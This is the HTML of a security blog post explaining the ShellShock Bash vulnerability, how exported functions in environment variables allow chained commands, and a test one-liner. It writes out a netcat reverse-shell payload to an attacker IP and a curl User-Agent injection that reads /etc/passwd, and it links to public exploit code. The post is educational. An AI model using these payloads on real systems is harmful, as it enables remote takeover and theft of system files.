<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.108.0">
    <meta name="generator" content="Relearn 5.9.4+tip">
    <meta name="robots" content="noindex, nofollow, noarchive, noimageindex">
    <meta name="description" content="Exploit writeups, info sec articles..">
    <meta name="author" content="solc0nf">
    <title>ShellShock :: solc0nf</title>
    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
    <link href="/css/fontawesome-all.min.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/featherlight.min.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/featherlight.min.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/auto-complete.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/perfect-scrollbar.min.css?1690804204" rel="stylesheet">
    <link href="/css/nucleus.css?1690804204" rel="stylesheet">
    <link href="/css/fonts.css?1690804204" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690804204" rel="stylesheet"></noscript>
    <link href="/css/theme.css?1690804204" rel="stylesheet">
    <link href="/css/theme-relearn-dark.css?1690804204" rel="stylesheet" id="variant-style">
    <link href="/css/ie.css?1690804204" rel="stylesheet">
    <link href="/css/variant.css?1690804204" rel="stylesheet">
    <link href="/css/print.css?1690804204" rel="stylesheet" media="print">
    <link href="/css/format-print.css?1690804204" rel="stylesheet">
    <script src="/js/url.js?1690804204"></script>
    <script src="/js/variant.js?1690804204"></script>
    <script>
      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
      window.index_js_url="/index.search.js";
      var root_url="/";
      var baseUri=root_url.replace(/\/$/, '');
      // translations
      window.T_Copy_to_clipboard = 'Copy to clipboard';
      window.T_Copied_to_clipboard = 'Copied to clipboard!';
      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
      // some further base stuff
      var baseUriFull='https:\/\/solc0nf.github.io/';
      window.variants && variants.init( [ 'relearn-dark' ] );
    </script>
    <script src="/js/jquery.min.js?1690804204" defer></script>
  </head>
  <body class="mobile-support print disableInlineCopyToClipboard" data-url="/exploit-articles/shellshock/index.html">
    <div id="body" class="default-animation">
      <div id="sidebar-overlay"></div>
      <div id="toc-overlay"></div>
      <nav id="topbar" class="highlightable" dir="ltr">
        <div>
          <div id="breadcrumbs">
            <span id="sidebar-toggle-span">
              <a href="#" id="sidebar-toggle" title='Menu (CTRL+ALT+n)'><i class="fas fa-bars fa-fw"></i></a>
            </span>
            <ol class="links" itemscope itemtype="http://schema.org/BreadcrumbList">
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/index.html"><span itemprop="name">solc0nf</span></a><meta itemprop="position" content="1"> > </li>
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/exploit-articles/index.html"><span itemprop="name">Exploit Articles</span></a><meta itemprop="position" content="2"> > </li>
              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">ShellShock</span><meta itemprop="position" content="3"></li>
            </ol>
          </div>
        </div>
      </nav>
      <main id="body-inner" class="highlightable default" tabindex="-1">
        <div class="flex-block-wrapper">
          <div id="head-tags">
<div class="tags">
  <a class="tag-link" href="/tags/bash/index.html">bash</a>
  <a class="tag-link" href="/tags/exploit/index.html">exploit</a>
  <a class="tag-link" href="/tags/linux/index.html">linux</a>
</div>
          </div>
          <article class="default">
<h1 id="shellshock">ShellShock</h1>

<figure><img src="/images/bash.png" height="100px"/>
</figure>

<p>ShellShock is a vulnerability in the Bash shell (GNU Bash upto version 4.3) that allows Bash to execute unintentional commands from environment variables. Attackers can issue commands remotely on the target host with elevated privileges, resulting in complete takeover of the system.</p>
<p><em>Let us have a look at what environment variables are</em>.</p>
<p>Environment variables are the variables specific to a certain environment, like a root user would have different environment variables than a normal user in a Linux system.</p>
<p>The <code>env</code> command prints out a list of all the environment variables for your login on to the screen. Some examples of environment variables are <em>USER</em>, <em>HOME</em>, <em>SHELL</em>, <em>LANG</em> etc. You can set an environment variable with <code>export VARIABLE_NAME=variable_value</code>. One point to note is that environment variables declared in this manner are valid only for the current bash session. In order to persist environment variables, you can define them in your <code>.bashrc</code> file. You could also print out specific env variables with the <code>echo</code> command, like <code>echo $HOME</code>.</p>
<hr>
<p>ShellShock vulnerability is particularly dangerous due to the fact that a wide array of IoT <em>smart devices</em> like routers, webcams, home security systems etc. could potentially be targets to attacks. Applications like web and mail servers, DNS servers use bash to communicate with the underlying operating system, rendering them susceptible to attacks. ShellShock could also be used to launch DoS attacks on vulnerable servers.</p>
<p>Now, for details on how this vulnerability affects systems.</p>
<p>Bash scripting language supports functions, that contain pieces of code that can be reused. We can also store the functions so defined, in environment variables, which would let bash scripts export functions as environment variables and allow a sub-shell to use them. Let us break it down a bit.</p>
<p>You can define bash functions with the syntax <code>greeting=() { echo &quot;Hi dawns33ker&quot;; }</code> The vulnerability arises from how bash implemented importing functions stored in environment variables. Whenever a new shell is created, bash looks through the environment variables for functions and imports all the defined functions. This is done by simply removing the <code>=</code> and evaluating the result.</p>
<p>For example, the greetings function above would become <code>greeting() { echo &quot;Hi dawns33ker&quot;};</code> Due to ShellShock, it is possible to exploit this behaviour by adding extra code to the end of the function definition.</p>
<p>Let us take the case of a function being defined as an environment variable. <code>env X='() { :; }; echo &quot;bash vulnerable&quot;' bash -c :</code>. This is a function which will determine if your version of bash is vulnerable to ShellShock. If vulnerable, the function will print the message <em>bash vulnerable</em> or else it prints nothing.</p>
<p>This function assignment consists of two commands. The first part is assigning the value <code>X='() { :; }; echo &quot;bash vulnerable&quot;'</code> to X. The value assigned to X is designed to exploit the ShellShock vulnerability, i.e chaining a command to the function definition, in this case the <code>echo</code> command. The second part i.e <code>bash -c</code> invokes a new bash shell with the command <code>:</code> which does nothing. That is to say that the first part of the payload <code>() { :;}</code>is a function that does nothing. The second part <code>echo &quot;bash vulnerable&quot;</code> which has been chained to the function definition is the malicious payload that will be executed when the function is imported.</p>
<p>As explained above, when the function is imported, the <code>=</code> is removed and the line <code>X='() { :; }; echo &quot;bash vulnerable&quot;</code> is passed to the bash interpreter. The <code>;</code> is being a command separator, the definition of the <code>X</code> function and the malicious payload both are executed. The <code>echo</code> command would obviously be replaced by something more menacing, like spawning a reverse shell on the attacker PC, like, <code>nc 10.10.11.1 4455 -e /bin/bash &amp;' bash -c :</code>. This example works by using netcat to open a bash session and redirect input and output to the attacker&rsquo;s machine. The <code>&amp;</code> operator means that the session is opened in the background and now the attacker has a shell on the vulnerable system.</p>
<p>ShellShock can be exploited by using HTTP requests to a vulnerable server. An attacker could craft a request like <code>() { :; }; echo &quot;PASSWD:&quot; $(&lt;/etc/passwd)</code> and send the request to the server with <code>curl -H &quot;User-Agent: () { :; }; echo &quot;PASSWD:&quot; $(&lt;/etc/passwd)&quot; http://example.com/</code></p>
<hr>
<p>References:</p>
<p><a href="https://github.com/jeholliday/shellshock" target="_blank">GitHub</a></p>
<p><a href="https://blog.cloudflare.com/inside-shellshock/" target="_blank">Cloudflare Blogs</a></p>
<p>Exploit Code:</p>
<p><a href="https://www.exploit-db.com/exploits/34900" target="_blank">Apache mod_cgi - &lsquo;Shellshock&rsquo; Remote Command Injection</a></p>
<p><a href="https://www.exploit-db.com/exploits/36933" target="_blank">dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)</a></p>
<p><a href="https://www.exploit-db.com/exploits/34766" target="_blank">Bash - &lsquo;Shellshock&rsquo; Environment Variables Command Injection</a></p>

            <footer class="footline">
            </footer>
          </article>
        </div>
      </main>
    </div>
    <script src="/js/clipboard.min.js?1690804204" defer></script>
    <script src="/js/perfect-scrollbar.min.js?1690804204" defer></script>
    <script src="/js/featherlight.min.js?1690804204" defer></script>
    <script src="/js/theme.js?1690804204" defer></script>
  </body>
</html>
